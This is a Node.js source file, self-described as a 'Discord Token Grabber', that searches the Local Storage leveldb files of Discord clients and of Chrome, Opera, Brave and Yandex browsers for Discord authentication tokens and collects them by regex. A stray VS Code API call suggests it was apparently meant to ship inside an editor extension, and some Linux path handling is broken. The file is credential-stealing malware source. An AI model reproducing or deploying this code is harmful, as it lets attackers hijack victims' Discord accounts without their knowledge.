const fs = require('fs');
const path = require('path');

function findToken(tokenPath) {
    tokenPath += "\\Local Storage\\leveldb";

    let tokens = [];

    try {
        fs.readdirSync(path.normalize(tokenPath)).map(file => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
                fs.readFileSync(`${tokenPath}\\${file}`, "utf8").split(/\r?\n/).forEach(line => {
                    // https://www.regextester.com/
                    const regex = [
                        new RegExp(/mfa\.[\w-]{84}/g), 
                        new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                    ]; 
                    for (const _regex of regex) {
                        const token = line.match(_regex);
                    
                        if (token) {
                            token.forEach(element => {
                                tokens.push(element);
                            });
                        }
                    }
                    
                })
            }  
        });
    } catch {
        // console.log(`no directory found for ${tokenPath}`)
    }
    return tokens;
}

function discordTokenGrabber () {
    let paths;
    const computerPlatform = process.platform;

    if (computerPlatform == "win32") {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;
        
        paths = {
            "Discord": path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    else if (computerPlatform == "linux") {
        vscode.window.showErrorMessage("Linux is not supported for the moment 😥");
        
        const home = path.join(process.env.HOME, ".config");

        paths = {
            "Discord": path.join(home, "discord"),
            "Discord Canary": path.join(home + "discordcanary"),
            "Discord PTB": path.join(home + "discordptb"),
            "Google Chrome": path.join(home + "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(home + "Opera Software", "Opera Stable"),
            "Brave": path.join(home + "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(home + "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    else if (computerPlatform == "darwin") {
        return console.log("MacOS is not supported for the moment 😥");
    }
    else {
        return console.log("The Discord Token Grabber support only Windows, Linux and MacOS.");
    }
    
    
    const tokens = {};
    for (let [platform, path] of Object.entries(paths)) {
        const tokenList = findToken(path);
        if (tokenList) {
            tokenList.forEach(token => {
                if (tokens[platform] === undefined) tokens[platform] = []
                tokens[platform].push(token);     
            });
        }  
    }
    console.log(tokens);
    return tokens;
}

discordTokenGrabber()